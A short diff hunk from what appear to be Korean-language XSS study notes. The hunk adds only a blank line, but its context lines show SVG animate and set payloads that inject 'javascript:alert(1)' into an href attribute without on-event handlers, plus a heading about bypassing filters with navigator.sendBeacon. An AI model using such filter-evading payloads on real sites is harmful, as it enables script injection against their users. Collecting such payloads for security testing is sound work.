@@ -27,6 +27,7 @@ navigator.sendBeacon 로 필터링 우회
 
 
 # on이벤트= 이 아닌 xss 삽입
+
 <animate attributeName="href" values="javascript:alert(1)" begin="0s" dur="0.1s" fill="freeze"/>
 
 <set attributeName="href" to="javascript:alert(1)" begin="x.click"/>
